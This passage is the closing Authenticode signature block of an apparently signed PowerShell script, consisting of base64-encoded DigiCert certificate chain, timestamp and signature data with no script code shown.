# A1UdDgQWBBRJ+13W7/PcqVgZXZf87/JdXvGqxjANBgkqhkiG9w0BAQsFAAOCAQEA
# MDUJsw0AephOCByoLTFSm8hnB4I7s8ddA64vDTv4QF2TcXdrd/glByhEQexUEDpw
# lPCSbzHAmRM5X71QYNoB/CDlCoAO8BQnbegqkhAx8ubRyciwsLA4ZPp+/GFbgZaV
# khkOWpL6v6fmU3kSB5px+roqOuMjmqvbtCDlC4JH25WuDEgGJQhqpgdQSZdomWjH
# le/GnQKt4Y18ysVFvgE1lRO8x6gkJ5IJbZPJ0Q//2xCvtM0WpjXmQl1RHV/7tqDS
# fqprCQxuKiTPC64VfafzeS7IUNJMgQS73H6wuaKdeT85PIxreleNwNXfbr4O/FY3
# eqlSEZAqzKtZXfNFWPmHazCCBY0wggR1oAMCAQICEA6bGI750C3n79tQ4ghAGFow
# DQYJKoZIhvcNAQEMBQAwZTELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0
# IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIGA1UEAxMbRGlnaUNl
# cnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTIyMDgwMTAwMDAwMFoXDTMxMTEwOTIz
# NTk1OVowYjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcG
# A1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgVHJ1c3Rl
# ZCBSb290IEc0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAv+aQc2je
# u+RdSjwwIjBpM+zCpyUuySE98orYWcLhKac9WKt2ms2uexuEDcQwH/MbpDgW61bG
# l20dq7J58soR0uRf1gU8Ug9SH8aeFaV+vp+pVxZZVXKvaJNwwrK6dZlqczKU0RBE
# EC7fgvMHhOZ0O21x4i0MG+4g1ckgHWMpLc7sXk7Ik/ghYZs06wXGXuxbGrzryc/N
# rDRAX7F6Zu53yEioZldXn1RYjgwrt0+nMNlW7sp7XeOtyU9e5TXnMcvak17cjo+A
# 2raRmECQecN4x7axxLVqGDgDEI3Y1DekLgV9iPWCPhCRcKtVgkEy19sEcypukQF8
# IUzUvK4bA3VdeGbZOjFEmjNAvwjXWkmkwuapoGfdpCe8oU85tRFYF/ckXEaPZPfB
# aYh2mHY9WV1CdoeJl2l6SPDgohIbZpp0yt5LHucOY67m1O+SkjqePdwA5EUlibaa
# RBkrfsCUtNJhbesz2cXfSwQAzH0clcOP9yGyshG3u3/y1YxwLEFgqrFjGESVGnZi
# fvaAsPvoZKYz0YkH4b235kOkGLimdwHhD5QMIR2yVCkliWzlDlJRR3S+Jqy2QXXe
# eqxfjT/JvNNBERJb5RBQ6zHFynIWIgnffEx1P2PsIV/EIFFrb7GrhotPwtZFX50g
# /KEexcCPorF+CiaZ9eRpL5gdLfXZqbId5RsCAwEAAaOCATowggE2MA8GA1UdEwEB
# /wQFMAMBAf8wHQYDVR0OBBYEFOzX44LScV1kTN8uZz/nupiuHA9PMB8GA1UdIwQY
# MBaAFEXroq/0ksuCMS1Ri6enIZ3zbcgPMA4GA1UdDwEB/wQEAwIBhjB5BggrBgEF
# BQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBD
# BggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0
# QXNzdXJlZElEUm9vdENBLmNydDBFBgNVHR8EPjA8MDqgOKA2hjRodHRwOi8vY3Js
# My5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMBEGA1Ud
# IAQKMAgwBgYEVR0gADANBgkqhkiG9w0BAQwFAAOCAQEAcKC/Q1xV5zhfoKN0Gz22
# Ftf3v1cHvZqsoYcs7IVeqRq7IviHGmlUIu2kiHdtvRoU9BNKei8ttzjv9P+Aufih
# 9/Jy3iS8UgPITtAq3votVs/59PesMHqai7Je1M/RQ0SbQyHrlnKhSLSZy51PpwYD
# E3cnRNTnf+hZqPC/Lwum6fI0POz3A8eHqNJMQBk1RmppVLC4oVaO7KTVPeix3P0c
# 2PR3WlxUjG/voVA9/HYJaISfb8rbII01YBwCA8sgsKxYoA5AY8WYIsGyWfVVa88n
# q2x2zm8jLfR+cWojayL/ErhULSd+2DrZ8LaHlv1b0VysGMNNn3O3AamfV6peKOK5
# lDCCBrQwggScoAMCAQICEA3HrFcF/yGZLkBDIgw6SYYwDQYJKoZIhvcNAQELBQAw
# YjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQ
# d3d3LmRpZ2ljZXJ0LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgVHJ1c3RlZCBSb290
# IEc0MB4XDTI1MDUwNzAwMDAwMFoXDTM4MDExNDIzNTk1OVowaTELMAkGA1UEBhMC
# VVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMUEwPwYDVQQDEzhEaWdpQ2VydCBU
# cnVzdGVkIEc0IFRpbWVTdGFtcGluZyBSU0E0MDk2IFNIQTI1NiAyMDI1IENBMTCC
# AiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBALR4MdMKmEFyvjxGwBysdduj
# Rmh0tFEXnU2tjQ2UtZmWgyxU7UNqEY81FzJsQqr5G7A6c+Gh/qm8Xi4aPCOo2N8S
# 9SLrC6Kbltqn7SWCWgzbNfiR+2fkHUiljNOqnIVD/gG3SYDEAd4dg2dDGpeZGKe+
# 42DFUF0mR/vtLa4+gKPsYfwEu7EEbkC9+0F2w4QJLVSTEG8yAR2CQWIM1iI5PHg6
# 2IVwxKSpO0XaF9DPfNBKS7Zazch8NF5vp7eaZ2CVNxpqumzTCNSOxm+SAWSuIr21
# Qomb+zzQWKhxKTVVgtmUPAW35xUUFREmDrMxSNlr/NsJyUXzdtFUUt4aS4CEeIY8
# y9IaaGBpPNXKFifinT7zL2gdFpBP9qh8SdLnEut/GcalNeJQ55IuwnKCgs+nrpuQ
# NfVmUB5KlCX3ZA4x5HHKS+rqBvKWxdCyQEEGcbLe1b8Aw4wJkhU1JrPsFfxW1gao
# u30yZ46t4Y9F20HHfIY4/6vHespYMQmUiote8ladjS/nJ0+k6MvqzfpzPDOy5y6g
# qztiT96Fv/9bH7mQyogxG9QEPHrPV6/7umw052AkyiLA6tQbZl1KhBtTasySkuJD
# psZGKdlsjg4u70EwgWbVRSX1Wd4+zoFpp4Ra+MlKM2baoD6x0VR4RjSpWM8o5a6D
# 8bpfm4CLKczsG7ZrIGNTAgMBAAGjggFdMIIBWTASBgNVHRMBAf8ECDAGAQH/AgEA
# MB0GA1UdDgQWBBTvb1NK6eQGfHrK4pBW9i/USezLTjAfBgNVHSMEGDAWgBTs1+OC
# 0nFdZEzfLmc/57qYrhwPTzAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0lBAwwCgYIKwYB
# BQUHAwgwdwYIKwYBBQUHAQEEazBpMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5k
# aWdpY2VydC5jb20wQQYIKwYBBQUHMAKGNWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0
# LmNvbS9EaWdpQ2VydFRydXN0ZWRSb290RzQuY3J0MEMGA1UdHwQ8MDowOKA2oDSG
# Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRSb290RzQu
# Y3JsMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG/WwHATANBgkqhkiG9w0B
# AQsFAAOCAgEAF877FoAc/gc9EXZxML2+C8i1NKZ/zdCHxYgaMH9Pw5tcBnPw6O6F
# TGNpoV2V4wzSUGvI9NAzaoQk97frPBtIj+ZLzdp+yXdhOP4hCFATuNT+ReOPK0mC
# efSG+tXqGpYZ3essBS3q8nL2UwM+NMvEuBd/2vmdYxDCvwzJv2sRUoKEfJ+nN57m
# QfQXwcAEGCvRR2qKtntujB71WPYAgwPyWLKu6RnaID/B0ba2H3LUiwDRAXx1Neq9
# ydOal95CHfmTnM4I+ZI2rVQfjXQA1WSjjf4J2a7jLzWGNqNX+DF0SQzHU0pTi4dB
# wp9nEC8EAqoxW6q17r0z0noDjs6+BFo+z7bKSBwZXTRNivYuve3L2oiKNqetRHdq
# fMTCW/NmKLJ9M+MtucVGyOxiDf06VXxyKkOirv6o02OoXN4bFzK0vlNMsvhlqgF2
# puE6FndlENSmE+9JGYxOGLS/D284NHNboDGcmWXfwXRy4kbu4QFhOm0xJuF2EZAO
# k5eCkhSxZON3rGlHqhpB/8MluDezooIs8CVnrpHMiD2wL40mm53+/j7tFaxYKIqL
# 0Q4ssd8xHZnIn/7GELH3IdvG2XlM9q7WP/UwgOkw/HQtyRN62JK4S1C8uw3PdBun
# vAZapsiI5YKdvlarEvf8EA+8hcpSM9LHJmyrxaFtoza2zNaQ9k+5t1wwggbtMIIE
# 1aADAgECAhAKgO8YS43xBYLRxHanlXRoMA0GCSqGSIb3DQEBCwUAMGkxCzAJBgNV
# BAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNl
# cnQgVHJ1c3RlZCBHNCBUaW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBD
# QTEwHhcNMjUwNjA0MDAwMDAwWhcNMzYwOTAzMjM1OTU5WjBjMQswCQYDVQQGEwJV
# UzEXMBUGA1UEChMORGlnaUNlcnQsIEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFNI
# QTI1NiBSU0E0MDk2IFRpbWVzdGFtcCBSZXNwb25kZXIgMjAyNSAxMIICIjANBgkq
# hkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0EasLRLGntDqrmBWsytXum9R/4ZwCgHf
# yjfMGUIwYzKomd8U1nH7C8Dr0cVMF3BsfAFI54um8+dnxk36+jx0Tb+k+87H9WPx
# NyFPJIDZHhAqlUPt281mHrBbZHqRK71Em3/hCGC5KyyneqiZ7syvFXJ9A72wzHpk
# BaMUNg7MOLxI6E9RaUueHTQKWXymOtRwJXcrcTTPPT2V1D/+cFllESviH8YjoPFv
# ZSjKs3SKO1QNUdFd2adw44wDcKgH+JRJE5Qg0NP3yiSyi5MxgU6cehGHr7zou1zn
# OM8odbkqoK+lJ25LCHBSai25CFyD23DZgPfDrJJJK77epTwMP6eKA0kWa3osAe8f
# cpK40uhktzUd/Yk0xUvhDU6lvJukx7jphx40DQt82yepyekl4i0r8OEps/FNO4ah
# fvAk12hE5FVs9HVVWcO5J4dVmVzix4A77p3awLbr89A90/nWGjXMGn7FQhmSlIUD
# y9Z2hSgctaepZTd0ILIUbWuhKuAeNIeWrzHKYueMJtItnj2Q+aTyLLKLM0MheP/9
# w6CtjuuVHJOVoIJ/DtpJRE7Ce7vMRHoRon4CWIvuiNN1Lk9Y+xZ66lazs2kKFSTn
# nkrT3pXWETTJkhd76CIDBbTRofOsNyEhzZtCGmnQigpFHti58CSmvEyJcAlDVcKa
# cJ+A9/z7eacCAwEAAaOCAZUwggGRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFOQ7
# /PIx7f391/ORcWMZUEPPYYzoMB8GA1UdIwQYMBaAFO9vU0rp5AZ8esrikFb2L9RJ
# 7MtOMA4GA1UdDwEB/wQEAwIHgDAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCBlQYI
# KwYBBQUHAQEEgYgwgYUwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0
# LmNvbTBdBggrBgEFBQcwAoZRaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0Rp
# Z2lDZXJ0VHJ1c3RlZEc0VGltZVN0YW1waW5nUlNBNDA5NlNIQTI1NjIwMjVDQTEu
# Y3J0MF8GA1UdHwRYMFYwVKBSoFCGTmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9E
# aWdpQ2VydFRydXN0ZWRHNFRpbWVTdGFtcGluZ1JTQTQwOTZTSEEyNTYyMDI1Q0Ex
# LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglghkgBhv1sBwEwDQYJKoZIhvcN
# AQELBQADggIBAGUqrfEcJwS5rmBB7NEIRJ5jQHIh+OT2Ik/bNYulCrVvhREafBYF
# 0RkP2AGr181o2YWPoSHz9iZEN/FPsLSTwVQWo2H62yGBvg7ouCODwrx6ULj6hYKq
# dT8wv2UV+Kbz/3ImZlJ7YXwBD9R0oU62PtgxOao872bOySCILdBghQ/ZLcdC8cbU
# UO75ZSpbh1oipOhcUT8lD8QAGB9lctZTTOJM3pHfKBAEcxQFoHlt2s9sXoxFizTe
# HihsQyfFg5fxUFEp7W42fNBVN4ueLaceRf9Cq9ec1v5iQMWTFQa0xNqItH3CPFTG
# 7aEQJmmrJTV3Qhtfparz+BW60OiMEgV5GWoBy4RVPRwqxv7Mk0Sy4QHs7v9y69NB
# qycz0BZwhB9WOfOu/CIJnzkQTwtSSpGGhLdjnQ4eBpjtP+XB3pQCtv4E5UCSDag6
# +iX8MmB10nfldPF9SVD7weCC3yXZi/uuhqdwkgVxuiMFzGVFwYbQsiGnoa9F5AaA
# yBjFBtXVLcKtapnMG3VH3EmAp/jsJ3FVF3+d1SVDTmjFjLbNFZUWMXuZyvgLfgyP
# ehwJVxwC+UpX2MSey2ueIu9THFVkT+um1vshETaWyQo8gmBto/m3acaP9QsuLj3F
# NwFlTxq25+T4QwX9xa6ILs84ZPvmpovq90K8eWyG2N01c4IhSOxqt81nMYIE+jCC
# BPYCAQEwLzAbMRkwFwYDVQQDDBBSSFNIT1VSQVYtSVQtT3BzAhAQvylGgaQVhE7g
# tCp7LUPgMAkGBSsOAwIaBQCgeDAYBgorBgEEAYI3AgEMMQowCKACgAChAoAAMBkG
# CSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEE
# AYI3AgEVMCMGCSqGSIb3DQEJBDEWBBSQYzXGAK8J6v0OmbOhw+uvr8CjPDANBgkq
# hkiG9w0BAQEFAASCAQCo0M24w8lUIDilS6E0fTSn3eM5nF5+xyILE7qhEGR1MTc3
# cZg5AnsK4YUvmWc38RC0Vw39YRPnjBdjRo1RvE83mQwMOje5ydVD7CaKuc+z5eWZ
# 20gb8NeIRddjUhiLlJcBcN0q1IuW435qnUakPcy8BBYWgz9r5aEFlB394hcHibAP
# N3WWj6MZyJQUYn853xO6SBnLuBscjFbkDMd7C+0xqVopLQB2qsrN0h7rSGgYeptv
# z5WpN0Sx6Cx5cjMrGvAJzCnf9ez8mH0Qd66qqB48y5o8eU9JDZClGeOxse4H9UEQ
# qQN4cn/Fcg9UCk/CvlI3BeKVqSxxm2yrVwWpE5ZqoYIDJjCCAyIGCSqGSIb3DQEJ
# BjGCAxMwggMPAgEBMH0waTELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0
# LCBJbmMuMUEwPwYDVQQDEzhEaWdpQ2VydCBUcnVzdGVkIEc0IFRpbWVTdGFtcGlu
# ZyBSU0E0MDk2IFNIQTI1NiAyMDI1IENBMQIQCoDvGEuN8QWC0cR2p5V0aDANBglg
# hkgBZQMEAgEFAKBpMBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcN
# AQkFMQ8XDTI2MDcwNzA4NDQ1NFowLwYJKoZIhvcNAQkEMSIEIGw3FPnahxgMTtLZ
# JQwgmnIvCcLq/9Ilp31N+Lr+fBjjMA0GCSqGSIb3DQEBAQUABIICAGQE6wjOuvib
# vfqhlPos4jtJYGwA/tUmA5c5ea8DOgdXSBR7uIjmkpMwHTz6muSdBgPmossajqDz
# K4fPULH6MGvE5zG6jU9TxWFHfekps7TkWol0NaUgXlxf1lMYRZc6YHCiqR1xTYc0
# 1VSi2ATZd/cOD1vRCNNS7Ax0q9/RrFpAQi4rCEBI4MO1ZExvrfHwmfIBCDJS5M7j
# Ix3OUV8WAEK211dDThIXN3ln8P9c5Gpij9bGNDq55zxVBwSlPvK0oMryK5H5zLuh
# B2AzrB0sCe0aOh5Eg9l7aegbB1D0pO4CQOYam30m+urVJGDeiIjDONyB9k/hAr8T
# R4Nx3pHOhe8WrdBGdsTpEABsrIQvQnG19u64yDfkJh/7UD7L/JukSuRrVisSJ/qg
# yjkFBtHG3E8LHopf5Jzs70sURPW2+Ac+EdL1ymC2aba1N14egX7COJF4sK41+U+D
# 4IGsHGYsqbcK2d8F/vrsI0lMEtDSBOzVNBb7j3aq1Jo5wuHAZTDDCLDmPFYLays3
# MQDX93YTAvZQwHE+tsZ0oOnMhlq8UaZm2OgUCoYGSdk0FK7l0C3HZj5un2lC4uNN
# OGJPkHbeeqqdh2/eQVWcv7CB75UKEdNgqckW4Vk+75IiIA/0kEwzSnpiXhQL7ctH
# rUh5yHNJL8B4sz95USlXRNgBPTv8FAHd
# SIG # End signature block
